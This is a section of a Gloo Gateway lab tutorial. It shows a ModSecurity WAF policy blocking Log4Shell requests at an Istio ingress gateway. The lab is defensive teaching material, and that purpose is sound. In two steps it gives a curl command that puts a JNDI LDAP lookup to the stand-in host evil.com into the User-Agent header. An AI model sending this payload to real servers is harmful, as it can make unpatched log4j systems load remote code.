# Web Application Firewall

Gloo Gateway utilizes OWASP ModSecurity to add WAF features into the Istio ingress gateway. Not only can you enable the [OWASP Core Rule Set](https://owasp.org/www-project-modsecurity-core-rule-set/) easily, but also you can enable many other advanced features to protect your applications.

In this section of the lab, take a quick look at how to prevent the `log4j` exploit that was discovered in late 2021. For more details, you can review the [Gloo Edge blog](https://www.solo.io/blog/block-log4shell-attacks-with-gloo-edge/) that this implementation is based on.

1. Refer to following diagram from Swiss CERT to learn how the `log4j` attack works. Note that a JNDI lookup is inserted into a header field that is logged.
![log4j exploit](../images/log4j_attack.png)

2. Confirm that a malicious JNDI request currently succeeds. Note the `200` success response. Later, you create a WAF policy to block such requests.

```sh
curl -ik -X POST -H "User-Agent: \${jndi:ldap://evil.com/x}" -H "Host: checkout.solo.io" https://$GLOO_GATEWAY_HTTPS/shipping/quote
```

3. With the Gloo WAF policy custom resource, you can create reusable policies for ModSecurity. Review the `log4j` WAF policy which will apply to the checkout routes. 
```sh
kubectl apply -f 11-web-application-firewall/waf-policy.yaml
```

4. Try the previous request again.

```sh
curl -ik -X POST -H "User-Agent: \${jndi:ldap://evil.com/x}" -H "Host: checkout.solo.io" https://$GLOO_GATEWAY_HTTPS/shipping/quote
```

Note that the request is now blocked with the custom intervention message from the WAF policy.

```sh
HTTP/2 403
content-length: 27
content-type: text/plain
date: Wed, 18 May 2022 21:20:34 GMT
server: istio-envoy

Log4Shell malicious payload
```

Your frontend app is no longer susceptible to `log4j` attacks, nice!